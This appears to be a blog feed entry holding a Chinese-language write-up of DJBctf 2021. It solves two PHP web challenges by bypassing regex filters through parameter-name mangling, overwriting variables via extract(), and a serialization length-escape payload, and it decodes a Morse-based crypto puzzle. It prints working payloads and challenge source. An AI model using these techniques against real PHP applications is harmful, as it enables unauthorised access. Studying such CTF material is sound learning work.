        <content type="html"><![CDATA[<p>2021第一场比赛</p><p>昵称：别答了别答了再答人傻了</p><span id="more"></span><p>DJBctf，孩子太菜了呜呜呜</p><p>做了两道web，签到题有非预期(汗)，分析下预期和非预期解法，加上些个人的理解</p><p>本Web狗何德何能，尝试做了一道密码学…赛后才终于出了。</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">qwq</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Access Denied!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">oao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\-[a-e][^a-zA-Z0-8]&lt;b>(.*)>&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/'</span><span class="token punctuation">,</span> <span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Almost there."</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"Input correct parameters"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ans</span><span class="token operator">===</span><span class="token variable">$SecretNumber</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"Congratulations!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$my_ans</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>有一个类，可能是反序列化，但看到最后<code>call_user_func</code>，类里面还有个static函数，应该是直接调用了。</p><p>看逻辑，<code>php://input</code>，变量<code>str</code>从POST原始流读取数据，过滤后变量覆盖。然后传入<code>shaw_root</code>，满足条件会给hint，最后<code>$ans===$SecretNumber</code>即可调用函数了。</p><hr><p>首先传<code>shaw_root</code>，第一个点在过滤了<code>_</code>，根据PHP特性，<code>空格</code>，<code>.</code>传递最后都会转变为<code>-</code></p><p>如图所示，此为web3的调试，与本题此考点一致</p><img src="/article/djbctf2021/image-20210128164708984.png" class="" title="image-20210128164708984" loading="lazy"><img src="/article/djbctf2021/image-20210128164811979.png" class="" title="image-20210128164811979" loading="lazy"><p>传入空格，<code>.</code>都变成了<code>_</code></p><p>接下来就是绕正则了，去regex101调了半天(没学正则的懒狗—–&gt;我)，调了一个payload</p><img src="/article/djbctf2021/image-20210128165252056.png" class="" title="image-20210128165252056" loading="lazy"><p><code>-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra</code></p><p>传入得</p><img src="/article/djbctf2021/image-20210128165654959.png" class="" title="image-20210128165654959" loading="lazy"><pre class="language-none"><code class="language-none">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</code></pre><p>写脚本爆破,脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/23 16:58@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">MD5</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">10000</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">"shaw&#123;&#125;root"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span>m<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token operator">==</span> target <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind it:'</span><span class="token punctuation">,</span>text<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>            <span class="token keyword">break</span>        i <span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    MD5<span class="token punctuation">(</span><span class="token string">'166b47a5cb1ca2431a0edfcef200684f'</span><span class="token punctuation">)</span></code></pre><p>爆破得<code>shaw21475root</code></p><img src="/article/djbctf2021/image-20210128170204123.png" class="" title="image-20210128170204123" loading="lazy"><p>传入成功</p><img src="/article/djbctf2021/image-20210128170309356.png" class="" title="image-20210128170309356" loading="lazy"><p>表明成功了，最后一步调用函数，根据PHP文档，类static函数可以直接用<code>class::static function</code>调用，详情见<a href="https://www.php.net/manual/zh/function.call-user-func.php">官方文档</a></p><p>最终payload:<code>shaw root=-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra&amp;&amp;ans=21475&amp;&amp;my ans=qwq::oao</code></p><img src="/article/djbctf2021/image-20210128170748201.png" class="" title="image-20210128170748201" loading="lazy"><p>这里要注意，如果用HackBar发包的话要换模式</p><img src="/article/djbctf2021/image-20210128170832793.png" class="" title="image-20210128170832793" loading="lazy"><p>因为转义是阻挡你前进步伐的一大元凶</p><h4 id="题目思考"><a href="#题目思考" class="headerlink" title="题目思考"></a>题目思考</h4><p>因为变量覆盖，直接把<code>SecretNumber</code>覆盖就行了，本题在<code>str</code>处有个过滤<code>e</code>，所以不行</p><p><code>php://input</code>读入原始流数据，所以取反异或转义之类的方法都是不行的</p><hr><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>Web签到题(大概)，源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token string single-quoted-string">'ctfshowvip'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'wrong password'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_|\.|\]|\[/is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>标准反序列化长度逃逸，可惜非预期了</p><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>看<code>spaceman</code>类，两个变量由魔术方法<code>__construct</code>赋值，<code>filter</code>函数替换字符串，基本上就确定本题是反序列化长度逃逸了。</p><p>同样，<code>php://input</code>读取原始流数据变量覆盖，绕过方法同web1，构造反序列化</p><p><code>str_replace</code>将<code>ctfshowup</code>替换为<code>ctfshow</code>，也就是说原来9个字符变成了7个字符，有两个字符逃逸了。</p><p>我们的核心目标是将<code>password</code>覆盖为<code>ctfshowvip</code>，所以最后部分的序列化字符串应为<code>;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code>，一共35个字符。</p><p>所以它原始生成的部分应该被覆盖的为<code>&quot;;s:8:&quot;password&quot;;s:35:</code>即22个字符，所以<code>username</code>应该填入11个<code>ctfshowup</code>来覆盖它</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user_name</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup"</span><span class="token punctuation">;</span><span class="token variable">$pass_word</span><span class="token operator">=</span><span class="token string double-quoted-string">";s:8:\"password\";s:10:\"ctfshowvip\";&#125;"</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$test = unserialize($ser);</span><span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>最终payload</p><p><code>user name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&amp;&amp;pass word=;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code></p><p>记得空格绕<code>_</code></p><img src="/article/djbctf2021/image-20210128173924844.png" class="" title="image-20210128173924844" loading="lazy"><h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h4><p>由于变量覆盖，直接覆盖<code>pass_word</code>即可</p><p>payload：<code>pass word=ctfshowvip</code></p><img src="/article/djbctf2021/image-20210128174153341.png" class="" title="image-20210128174153341" loading="lazy"><h4 id="题目思考-1"><a href="#题目思考-1" class="headerlink" title="题目思考"></a>题目思考</h4><p><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong> </p><p>漏洞影响版本：</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>经典的反序列化长度逃逸的题目了</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="大佬们帮我看看我这个Python脚本为什么运行不了啊"><a href="#大佬们帮我看看我这个Python脚本为什么运行不了啊" class="headerlink" title="大佬们帮我看看我这个Python脚本为什么运行不了啊"></a>大佬们帮我看看我这个Python脚本为什么运行不了啊</h3><p>题目描述</p><pre class="language-none"><code class="language-none">菜鸡 9:36:27菜鸡上传了文件 新建文本文档.py菜鸡 9:37:02key1: Do you want a DaJiBei?菜鸡 9:37:61大佬们帮我看看我这个Python脚本为什么运行不了啊</code></pre><p>hint1:</p><pre class="language-none"><code class="language-none">最终结果是自带flag格式的，可以据此判断结果是否正确，不必浪费时间尝试提交格式</code></pre><p>hint2:</p><pre class="language-none"><code class="language-none">为什么运行结果里好好的3，也要写成大小写混乱的样子？</code></pre><p>hint3:</p><pre class="language-none"><code class="language-none">如果某个方向已经找不到更多的线索，不妨回头看看来时的道路</code></pre><p>hint4:</p><pre class="language-none"><code class="language-none">本题的加密方式来源于对以下问题的思考：如何在同一个载体上加密两段信息，且读取其中一种信息的过程会令另一种信息被破坏；并且，如果前一种信息的读取方式足够显而易见，是否可以在有限的短时间内尽可能转移注意力，减少非预期接收者发现另一段信息的可能性？ 为了降低难度，本题在选择每一种信息的加密方式时，尽可能选择了复杂度较低的做法；同时，将其中一段信息（相信大家都已经找到这一段了）设计为另一段信息加密方式的提示。</code></pre><p>hint5:</p><img src="/article/djbctf2021/hint.png" class="" title="hint.png" loading="lazy"><p>最终提示hint5直接点明摩斯密码</p><p>题目原件</p><pre class="language-python" data-language="python"><code class="language-python">fROM CRYPTO<span class="token punctuation">.</span>utIL<span class="token punctuation">.</span>NuMBER IMPORT BYteS_TO_LoNG<span class="token punctuation">,</span> long_TO_BYTESA_Fake_FLaG <span class="token operator">=</span> <span class="token string">B'FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;'</span>nuMBER <span class="token operator">=</span> bYTEs_tO_long<span class="token punctuation">(</span>a_FAKE_FLAG<span class="token punctuation">)</span>KeY1 <span class="token operator">=</span> <span class="token string">B'DO yOU WAnT A DAJIBEI?'</span>KEY1 <span class="token operator">=</span> Bytes_to_lONG<span class="token punctuation">(</span>KEY1<span class="token punctuation">)</span>KEY2 <span class="token operator">=</span> <span class="token number">0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481b</span>iv <span class="token operator">=</span> <span class="token number">10800</span>KEY3 <span class="token operator">=</span> KeY2 <span class="token operator">*</span> IVIS_THIS_rEAL_FlAG <span class="token operator">=</span> <span class="token punctuation">(</span>NUmber <span class="token operator">+</span> kEY3<span class="token punctuation">)</span> <span class="token operator">//</span> KEy1<span class="token keyword">print</span><span class="token punctuation">(</span>long_tO_bytes<span class="token punctuation">(</span>IS_THis_REAl_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>《关于我的老师看到直接气死过去怎么办》</p><p>根据题目描述，把<code>key1</code>替换为<code>Do you want a DaJiBei?</code></p><p>调整好格式跑一遍，得到<code>thrEE_means_3</code>，尝试各种单表加密均无果，根据hint4，对原始文件进行尝试还是无果，最后比赛快结束了，放出直接提示hint5，尝试将全篇小写转换为<code>.</code>，大写转换为<code>-</code>解密，发现摩斯密码表并不是固定位数，怕是要爆破排列组合，放弃了。</p><p>赛后出题人 @cheyenne 指点，本题摩斯密码统一采用五位一组，由总数为245位可得。</p><p>由于本人python正在自学水平一般，套用之前写过的一套C的替换程序</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*@Time ： 2021/1/24 13:58@Auth ： gyy@Blog ：http://err0r.top*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>FILE <span class="token operator">*</span>fpw<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c<span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token operator">=</span>str<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token char">'\n'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token char">'A'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token char">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>n<span class="token operator">++</span><span class="token punctuation">;</span><span class="token function">fputc</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token char">'a'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token char">'z'</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>       n<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token char">'.'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span>       <span class="token keyword">continue</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token char">' '</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fpr<span class="token punctuation">,</span><span class="token operator">*</span>fpw<span class="token punctuation">;</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpr<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't open!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpw<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't write!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span>fpr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用函数</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>浓浓的菜鸡味~，跑出结果</p><pre class="language-none"><code class="language-none">.---- ----- ..--- .---- ----- ---.. ----. --... .---- ----- ...-- .---- ..--- ...-- ---.. ...-- -.... ----. ---.. -.... .---- ----- .---- .---- .---- ----- ----. ..... .---- ----- ----. .---- ----- .---- ----. --... .---- .---- ----- .---- .---- ..... ----. ..... ..... -.... .---- ..--- .....</code></pre><p>拿去解密得</p><pre class="language-none"><code class="language-none">1021089710312383698610111095109101971101159556125</code></pre><p>看到ascii码<code> 102 108 97 103</code>立马起了反应，这是<code>flag</code>的ascii码，所以是每两个或三个组合成一个字符</p><pre class="language-none"><code class="language-none">102 108 97 103 123 83 69 86 101 110 95 109 101 97 110 115 95 56 125</code></pre><p>最后得到flag：<code>flag&#123;SEVen_means_8&#125;</code></p><p>无限接近答案，但密码学爷爷太强了呜呜呜</p><hr><p>有些收获吧，如有问题希望大佬们斧正。2021一起学习。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021</title>
      <link href="article/2021/"/>
      <url>article/2021/</url>
      
        <content type="html"><![CDATA[<p align="center">展望2021</p><span id="more"></span>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020BMZctf-Writeup</title>
      <link href="article/bmzctf2020/"/>
      <url>article/bmzctf2020/</url>
      
